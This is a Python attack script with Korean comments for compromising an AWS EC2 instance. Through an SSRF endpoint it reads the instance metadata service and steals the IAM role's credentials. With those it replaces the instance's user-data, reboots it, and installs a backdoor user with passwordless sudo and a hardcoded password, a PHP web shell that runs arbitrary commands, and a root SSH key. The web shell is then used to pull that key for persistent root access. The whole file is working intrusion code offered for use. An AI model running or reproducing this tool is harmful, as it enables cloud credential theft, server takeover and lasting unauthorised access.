#!/usr/bin/env python3
"""
실제 EC2 침투 도구 - IMDS만으로 루트 권한 획득
SSRF → AWS 자격증명 → EC2 제어 → User-data 수정 → 재부팅 → 루트 백도어
"""

import subprocess
import requests
import time
import sys
import json
import base64
from pathlib import Path

class RealPenetration:
    def __init__(self, target_ip):
        self.target_ip = target_ip
        self.webshell_url = f"http://{target_ip}/api/health.php"
        self.session = requests.Session()
        self.aws_creds = None
        self.instance_id = None

        # 색상
        self.RED = '\033[91m'
        self.GREEN = '\033[92m'
        self.YELLOW = '\033[93m'
        self.CYAN = '\033[96m'
        self.WHITE = '\033[97m'
        self.ENDC = '\033[0m'
        self.BOLD = '\033[1m'

    def print_success(self, text):
        print(f"{self.GREEN}[+] {text}{self.ENDC}")

    def print_error(self, text):
        print(f"{self.RED}[-] {text}{self.ENDC}")

    def print_info(self, text):
        print(f"{self.CYAN}[*] {text}{self.ENDC}")

    def get_aws_creds(self):
        """AWS 자격증명 탈취"""
        print(f"\n{self.BOLD}{self.YELLOW}=== AWS 자격증명 탈취 ==={self.ENDC}")

        try:
            # 인스턴스 ID 획득
            params = {'check': 'metadata', 'url': 'http://169.254.169.254/latest/meta-data/instance-id'}
            response = self.session.get(self.webshell_url, params=params, timeout=10)

            if response.status_code == 200:
                data = response.json()
                if 'metadata' in data:
                    self.instance_id = data['metadata'].strip()
                    self.print_success(f"인스턴스 ID: {self.instance_id}")

            # IAM 역할 이름
            params = {'check': 'metadata', 'url': 'http://169.254.169.254/latest/meta-data/iam/security-credentials/'}
            response = self.session.get(self.webshell_url, params=params, timeout=10)

            if response.status_code == 200:
                data = response.json()
                if 'metadata' in data:
                    role_name = data['metadata'].strip()
                    self.print_success(f"IAM 역할: {role_name}")

                    # 자격증명 획득
                    cred_url = f'http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name}'
                    params = {'check': 'metadata', 'url': cred_url}
                    cred_response = self.session.get(self.webshell_url, params=params, timeout=10)

                    if cred_response.status_code == 200:
                        cred_data = cred_response.json()
                        if 'metadata' in cred_data:
                            self.aws_creds = json.loads(cred_data['metadata'])
                            self.print_success("AWS 자격증명 탈취 완료!")

                            # 환경변수 설정
                            import os
                            os.environ['AWS_ACCESS_KEY_ID'] = self.aws_creds['AccessKeyId']
                            os.environ['AWS_SECRET_ACCESS_KEY'] = self.aws_creds['SecretAccessKey']
                            os.environ['AWS_SESSION_TOKEN'] = self.aws_creds['Token']
                            os.environ['AWS_DEFAULT_REGION'] = 'ap-northeast-2'

                            return True

        except Exception as e:
            self.print_error(f"자격증명 탈취 실패: {str(e)}")

        return False

    def create_backdoor_userdata(self):
        """루트 백도어가 포함된 User-data 생성"""
        userdata_script = '''#!/bin/bash

# 기존 SSM 에이전트 설정 유지
yum install -y amazon-ssm-agent
systemctl enable amazon-ssm-agent
systemctl start amazon-ssm-agent

# RedTeam 백도어 설치
useradd -m -s /bin/bash redteam
echo "redteam:RedTeam2024!@#" | chpasswd
echo "redteam ALL=(ALL) NOPASSWD:ALL" > /etc/sudoers.d/redteam
chmod 440 /etc/sudoers.d/redteam

# SSH 루트 키 생성
mkdir -p /root/.ssh
ssh-keygen -t rsa -b 2048 -f /root/.ssh/redteam_key -N ""
cp /root/.ssh/redteam_key.pub /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys
chmod 700 /root/.ssh

# 웹쉘 백도어
mkdir -p /var/www/html/public/uploads
echo '<?php if(isset($_GET["c"])) { echo shell_exec($_GET["c"]); } ?>' > /var/www/html/public/uploads/backdoor.php
chmod 644 /var/www/html/public/uploads/backdoor.php

# 시작 시 백도어 재설치 서비스
cat > /etc/systemd/system/redteam-backdoor.service << EOF
[Unit]
Description=RedTeam Backdoor Service
After=multi-user.target

[Service]
Type=oneshot
ExecStart=/bin/bash -c "echo 'RedTeam backdoor active' > /tmp/redteam-status"
RemainAfterExit=yes

[Install]
WantedBy=multi-user.target
EOF

systemctl enable redteam-backdoor.service
systemctl start redteam-backdoor.service

# 로그에 성공 메시지
echo "RedTeam backdoor installation completed at $(date)" >> /var/log/redteam.log
'''

        # Base64 인코딩
        userdata_b64 = base64.b64encode(userdata_script.encode()).decode()
        return userdata_b64

    def modify_userdata(self):
        """User-data 수정을 통한 루트 백도어 설치"""
        print(f"\n{self.BOLD}{self.YELLOW}=== User-data 수정 공격 ==={self.ENDC}")

        if not self.aws_creds or not self.instance_id:
            self.print_error("AWS 자격증명 또는 인스턴스 ID 없음")
            return False

        try:
            # 백도어 User-data 생성
            userdata_b64 = self.create_backdoor_userdata()

            # User-data 수정
            modify_cmd = [
                'aws', 'ec2', 'modify-instance-attribute',
                '--instance-id', self.instance_id,
                '--user-data', f'Value={userdata_b64}',
                '--region', 'ap-northeast-2'
            ]

            self.print_info("User-data에 루트 백도어 삽입 중...")
            result = subprocess.run(modify_cmd, capture_output=True, text=True, timeout=30)

            if result.returncode == 0:
                self.print_success("User-data 수정 성공!")
                return True
            else:
                self.print_error(f"User-data 수정 실패: {result.stderr}")
                return False

        except Exception as e:
            self.print_error(f"User-data 수정 오류: {str(e)}")
            return False

    def reboot_instance(self):
        """인스턴스 재부팅"""
        print(f"\n{self.BOLD}{self.YELLOW}=== 인스턴스 재부팅 ==={self.ENDC}")

        try:
            reboot_cmd = [
                'aws', 'ec2', 'reboot-instances',
                '--instance-ids', self.instance_id,
                '--region', 'ap-northeast-2'
            ]

            self.print_info("인스턴스 재부팅 중...")
            result = subprocess.run(reboot_cmd, capture_output=True, text=True, timeout=30)

            if result.returncode == 0:
                self.print_success("재부팅 명령 전송 완료!")
                self.print_info("약 2-3분 대기 후 백도어가 활성화됩니다")
                return True
            else:
                self.print_error(f"재부팅 실패: {result.stderr}")
                return False

        except Exception as e:
            self.print_error(f"재부팅 오류: {str(e)}")
            return False

    def verify_backdoor(self):
        """백도어 설치 확인"""
        print(f"\n{self.BOLD}{self.YELLOW}=== 백도어 확인 ==={self.ENDC}")

        self.print_info("재부팅 완료 대기 중 (3분)...")
        time.sleep(180)  # 3분 대기

        # 백도어 웹쉘 확인
        try:
            backdoor_url = f"http://{self.target_ip}/uploads/backdoor.php?c=whoami"
            response = requests.get(backdoor_url, timeout=10)

            if response.status_code == 200 and len(response.text.strip()) > 0:
                self.print_success(f"백도어 웹쉘 작동 확인: {response.text.strip()}")

                # 루트 권한 확인
                root_url = f"http://{self.target_ip}/uploads/backdoor.php?c=sudo%20whoami"
                root_response = requests.get(root_url, timeout=10)

                if root_response.status_code == 200 and "root" in root_response.text:
                    self.print_success("🔥 루트 권한 획득 성공!")
                    return True

        except Exception as e:
            self.print_error(f"백도어 확인 실패: {str(e)}")

        return False

    def establish_persistent_access(self):
        """지속적 접근 확보"""
        print(f"\n{self.BOLD}{self.YELLOW}=== 지속적 접근 확보 ==={self.ENDC}")

        try:
            # SSH 키 다운로드
            key_download_url = f"http://{self.target_ip}/uploads/backdoor.php?c=sudo%20cat%20/root/.ssh/redteam_key"
            response = requests.get(key_download_url, timeout=10)

            if response.status_code == 200 and "BEGIN RSA PRIVATE KEY" in response.text:
                # SSH 키 저장
                ssh_key_path = Path.home() / '.ssh' / 'redteam_final'

                with open(ssh_key_path, 'w') as f:
                    f.write(response.text)

                import os
                os.chmod(ssh_key_path, 0o600)

                self.print_success(f"루트 SSH 키 저장: {ssh_key_path}")

                # SSH 접속 테스트
                ssh_test_cmd = f'ssh -i {ssh_key_path} -o StrictHostKeyChecking=no root@{self.target_ip} "whoami"'
                result = subprocess.run(ssh_test_cmd, shell=True, capture_output=True, text=True, timeout=15)

                if result.returncode == 0 and "root" in result.stdout:
                    self.print_success("🚀 루트 SSH 접속 성공!")
                    return True

        except Exception as e:
            self.print_error(f"지속적 접근 확보 실패: {str(e)}")

        return False

    def run(self):
        """전체 침투 프로세스"""
        print(f"""
{self.RED}╔{'═'*68}╗{self.ENDC}
{self.RED}║{self.BOLD}{self.WHITE}   실제 EC2 루트 침투 도구 {self.ENDC}{' '*30}{self.RED}║{self.ENDC}
{self.RED}╚{'═'*68}╝{self.ENDC}

{self.YELLOW}타겟: {self.target_ip}{self.ENDC}
{self.CYAN}방법: SSRF → AWS → User-data → 재부팅 → Root{self.ENDC}
        """)

        # 1. AWS 자격증명 탈취
        if not self.get_aws_creds():
            return False

        # 2. User-data 수정
        if not self.modify_userdata():
            return False

        # 3. 인스턴스 재부팅
        if not self.reboot_instance():
            return False

        # 4. 백도어 확인
        if not self.verify_backdoor():
            return False

        # 5. 지속적 접근 확보
        if not self.establish_persistent_access():
            return False

        # 성공 메시지
        print(f"""
{self.GREEN}╔{'═'*68}╗{self.ENDC}
{self.GREEN}║{self.BOLD}{self.WHITE}   실제 루트 침투 성공! {self.ENDC}{' '*34}{self.GREEN}║{self.ENDC}
{self.GREEN}╚{'═'*68}╝{self.ENDC}

{self.BOLD}{self.GREEN}획득한 접근 방법:{self.ENDC}
{self.YELLOW}• SSH 루트 접속:{self.ENDC} ssh -i ~/.ssh/redteam_final root@{self.target_ip}
{self.YELLOW}• 웹쉘 백도어:{self.ENDC} http://{self.target_ip}/uploads/backdoor.php?c=whoami
{self.YELLOW}• 백도어 사용자:{self.ENDC} redteam / RedTeam2024!@#

{self.BOLD}{self.RED}🔥 TARGET COMPLETELY OWNED! 🔥{self.ENDC}
        """)

        return True


def main():
    if len(sys.argv) < 2:
        print("Usage: python3 real_penetration.py <target_ip>")
        sys.exit(1)

    target_ip = sys.argv[1]

    penetrator = RealPenetration(target_ip)

    if penetrator.run():
        sys.exit(0)
    else:
        sys.exit(1)


if __name__ == '__main__':
    main()